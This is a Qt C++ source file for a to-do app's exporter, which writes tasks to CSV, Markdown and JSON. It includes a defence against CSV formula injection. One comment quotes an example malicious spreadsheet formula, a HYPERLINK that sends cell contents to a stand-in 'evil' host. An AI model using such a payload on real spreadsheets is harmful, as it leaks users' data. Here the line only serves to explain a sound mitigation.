#include "taskexporter.h"
#include "storage/datastore.h"
#include "model/task.h"
#include "model/project.h"
#include "model/section.h"
#include "model/label.h"
#include "model/comment.h"
#include <QFile>
#include <QStandardPaths>
#include <QDir>
#include <QDateTime>
#include <QTextStream>
#include <QJsonDocument>
#include <QJsonObject>
#include <QJsonArray>
#include <QRegularExpression>
#include <QSet>

// CSV escape: wrap in quotes, escape internal quotes by doubling.
// RFC 4180 sec 2.6: a field containing comma, double-quote, CR, or LF must
// be enclosed in double-quotes. Bare CR matters because some downstream
// parsers (and Excel) treat CR as a row separator.
//
// Formula-injection defence: Excel / LibreOffice / Google Sheets treat any
// cell value starting with =, +, -, @, CR or TAB as a formula. A malicious
// task content like `=HYPERLINK("http://evil/?d="&A1,"click")` arriving via
// sync would then execute on export-open. Prefix such cells with a single
// quote so the spreadsheet keeps the literal text. The quote sits *inside*
// the (possibly quoted) field and is invisible in the cell, but parsers
// that don't honour it still get a readable string.
static QString csvEscape(const QString &s) {
    QString out = s;
    if (!out.isEmpty()) {
        const QChar c0 = out.front();
        if (c0 == QLatin1Char('=') || c0 == QLatin1Char('+')
                || c0 == QLatin1Char('-') || c0 == QLatin1Char('@')
                || c0 == QLatin1Char('\t') || c0 == QLatin1Char('\r')) {
            out.prepend(QLatin1Char('\''));
        }
    }
    if (out.contains(QChar(',')) || out.contains(QChar('"'))
            || out.contains(QChar('\n')) || out.contains(QChar('\r')))
        return QStringLiteral("\"%1\"").arg(out.replace(QChar('"'), QStringLiteral("\"\"")));
    return out;
}

// Pick a path that does not yet exist on disk. If `desired` is free, return
// it as-is; otherwise append "-1", "-2", ... before the suffix until a free
// slot is found. Used to prevent same-second filename collisions on the
// timestamped exports (CSV / MD).
static QString uniquifyPath(const QString &desired)
{
    if (!QFile::exists(desired))
        return desired;
    const int dot = desired.lastIndexOf(QChar('.'));
    const QString stem   = dot >= 0 ? desired.left(dot)   : desired;
    const QString suffix = dot >= 0 ? desired.mid(dot)    : QString();
    for (int i = 1; i < 10000; ++i) {
        const QString candidate = stem + QStringLiteral("-") + QString::number(i) + suffix;
        if (!QFile::exists(candidate))
            return candidate;
    }
    // Pathological fall-through: 10000 collisions in one second is a bug
    // elsewhere; let the caller overwrite rather than spin forever.
    return desired;
}

TaskExporter::TaskExporter(DataStore *store, QObject *parent)
    : QObject(parent), m_store(store)
{
}

QString TaskExporter::exportToCsv(const QString &dir)
{
    const QString outDir = dir.isEmpty()
        ? QStandardPaths::writableLocation(QStandardPaths::DocumentsLocation)
        : dir;
    QDir().mkpath(outDir);
    const QString stamp = QDateTime::currentDateTime().toString(QStringLiteral("yyyyMMdd-HHmmss"));
    const QString path = uniquifyPath(
        outDir + QStringLiteral("/opentodo-export-") + stamp + QStringLiteral(".csv"));

    QFile f(path);
    if (!f.open(QIODevice::WriteOnly | QIODevice::Text)) {
        emit exportFailed(QStringLiteral("Не удалось открыть файл для записи: ") + path);
        return {};
    }
    QTextStream out(&f);
    out.setEncoding(QStringConverter::Utf8);
    // Header
    out << "id,project,section,content,description,priority,due_date,labels,is_completed,created_at\n";

    for (const Task *t : m_store->allTasks()) {
        if (t->isDeleted()) continue;
        Project *p = m_store->projectById(t->projectId());
        Section *s = m_store->sectionById(t->sectionId());
        // night iter-109: datetime-only tasks carry an empty dueDate but a set
        // dueDatetime (B-1.28/B-1.30) — keying the due_date column off dueDate
        // alone left it blank for every timed task, silently dropping their
        // schedule from the CSV. Mirror the markdown-export fix (iter-116):
        // fall back to the datetime's date part for a homogeneous date-only
        // column. The full time is preserved in the ICS export.
        QString dueDateCell = t->dueDate();
        if (dueDateCell.isEmpty() && !t->dueDatetime().isEmpty())
            dueDateCell = t->dueDatetime().left(10);
        out << csvEscape(t->id()) << ","
            << csvEscape(p ? p->name() : QString()) << ","
            << csvEscape(s ? s->name() : QString()) << ","
            << csvEscape(t->content()) << ","
            << csvEscape(t->description()) << ","
            << t->priority() << ","
            << csvEscape(dueDateCell) << ","
            << csvEscape(t->labels().join(QChar('|'))) << ","
            << (t->isCompleted() ? "true" : "false") << ","
            << csvEscape(t->createdAt().toString(Qt::ISODate)) << "\n";
    }
    f.close();
    emit exportSucceeded(path);
    return path;
}

// Render one MD checkbox line for `t` (optionally indented) and recurse into
// its subtasks. Indent is 2 spaces per nesting level, which matches CommonMark
// nested-list rendering. The CR+LF stripper uses a [\r\n]+ regex so that
// CRLF in a description does not leave a stray CR behind (a hard line break
// for strict renderers).
static void renderMdTaskRecursive(QTextStream &out,
                                  const DataStore *store,
                                  const Task *t,
                                  int depth)
{
    if (!t || t->isDeleted()) return;

    const QString indent(depth * 2, QChar(' '));
    const QChar mark = t->isCompleted() ? QChar('x') : QChar(' ');
    out << indent << "- [" << mark << "] " << t->content();
    // night iter-116: show the due date for datetime-only tasks too (empty
    // dueDate, set dueDatetime) — keying off dueDate alone omitted the date for
    // timed tasks from the markdown export. Use the datetime's date part for a
    // consistent date-level annotation (the ICS export carries the full time).
    if (!t->dueDate().isEmpty())
        out << " \xF0\x9F\x93\x85 " << t->dueDate();
    else if (!t->dueDatetime().isEmpty())
        out << " \xF0\x9F\x93\x85 " << t->dueDatetime().left(10);
    if (t->priority() < 4) out << " \xE2\x9A\x91P" << t->priority();
    out << "\n";
    if (!t->description().isEmpty()) {
        static const QRegularExpression eolRe(QStringLiteral("[\\r\\n]+"));
        out << indent << "  > "
            << QString(t->description()).replace(eolRe, QStringLiteral(" "))
            << "\n";
    }

    // Recurse into subtasks (parentId == t->id()), preserving DataStore order.
    for (const Task *child : store->subtasks(t->id())) {
        renderMdTaskRecursive(out, store, child, depth + 1);
    }
}

QString TaskExporter::exportToMarkdown(const QString &dir)
{
    const QString outDir = dir.isEmpty()
        ? QStandardPaths::writableLocation(QStandardPaths::DocumentsLocation)
        : dir;
    QDir().mkpath(outDir);
    const QString stamp = QDateTime::currentDateTime().toString(QStringLiteral("yyyyMMdd-HHmmss"));
    const QString path = uniquifyPath(
        outDir + QStringLiteral("/opentodo-export-") + stamp + QStringLiteral(".md"));

    QFile f(path);
    if (!f.open(QIODevice::WriteOnly | QIODevice::Text)) {
        emit exportFailed(QStringLiteral("Не удалось открыть файл для записи: ") + path);
        return {};
    }
    QTextStream out(&f);
    out.setEncoding(QStringConverter::Utf8);
    out << "# OpenTodo — экспорт от "
        << QDateTime::currentDateTime().toString(QStringLiteral("dd.MM.yyyy HH:mm"))
        << "\n\n";

    for (const Project *p : m_store->allProjects()) {
        if (p->isDeleted() || p->isArchived()) continue;
        out << "## " << p->name() << "\n\n";
        // `tasksForProject` returns only top-level tasks (parentId empty);
        // we render those at depth 0 and recurse into their subtasks so the
        // nested hierarchy survives the export.
        for (const Task *t : m_store->tasksForProject(p->id())) {
            renderMdTaskRecursive(out, m_store, t, 0);
        }
        out << "\n";
    }
    f.close();
    emit exportSucceeded(path);
    return path;
}

QString TaskExporter::exportProjectToJson(const QString &projectId,
                                           const QString &dir)
{
    Project *p = m_store->projectById(projectId);
    if (!p) {
        emit exportFailed(QStringLiteral("Проект не найден"));
        return {};
    }

    const QString outDir = dir.isEmpty()
        ? QStandardPaths::writableLocation(QStandardPaths::DocumentsLocation)
        : dir;
    QDir().mkpath(outDir);

    const QString stamp = QDateTime::currentDateTime().toString(QStringLiteral("yyyyMMdd-HHmmss"));
    const QString safeName = QString(p->name())
        .replace(QRegularExpression(QStringLiteral("[\\\\/:*?\"<>|]")), QStringLiteral("_"))
        .left(80);
    const QString path = outDir + QStringLiteral("/opentodo-project-") + safeName
                         + QStringLiteral("-") + stamp + QStringLiteral(".json");

    QJsonObject root;
    root[QStringLiteral("format")]         = QStringLiteral("opentodo-project-snapshot");
    root[QStringLiteral("format_version")] = 1;
    root[QStringLiteral("exported_at")]    = QDateTime::currentDateTimeUtc().toString(Qt::ISODate);
    root[QStringLiteral("project")]        = p->toJson();

    // Sections
    QJsonArray sectionsArr;
    for (const Section *s : m_store->sectionsForProject(projectId)) {
        if (s) sectionsArr.append(s->toJson());
    }
    root[QStringLiteral("sections")] = sectionsArr;

    // Tasks — start with tasksForProject, then sweep allTasks to pick up any
    // subtasks or tasks that tasksForProject might have omitted.
    QJsonArray tasksArr;
    QSet<QString> projectTaskIds;

    for (const Task *t : m_store->tasksForProject(projectId)) {
        if (!t || t->isDeleted()) continue;
        tasksArr.append(t->toJson());
        projectTaskIds.insert(t->id());
    }

    for (const Task *t : m_store->allTasks()) {
        if (!t || t->isDeleted()) continue;
        if (t->projectId() != projectId) continue;
        if (projectTaskIds.contains(t->id())) continue;
        tasksArr.append(t->toJson());
        projectTaskIds.insert(t->id());
    }
    root[QStringLiteral("tasks")] = tasksArr;

    // Comments — task-level then project-level
    QJsonArray commentsArr;
    for (const QString &tid : std::as_const(projectTaskIds)) {
        for (const Comment *c : m_store->commentsForTask(tid)) {
            if (c && !c->isDeleted()) commentsArr.append(c->toJson());
        }
    }
    for (const Comment *c : m_store->commentsForProject(projectId)) {
        if (c && !c->isDeleted()) commentsArr.append(c->toJson());
    }
    root[QStringLiteral("comments")] = commentsArr;

    // Write
    QFile f(path);
    if (!f.open(QIODevice::WriteOnly)) {
        emit exportFailed(QStringLiteral("Не удалось открыть файл для записи: ") + path);
        return {};
    }
    f.write(QJsonDocument(root).toJson(QJsonDocument::Indented));
    f.close();

    emit exportSucceeded(path);
    return path;
}
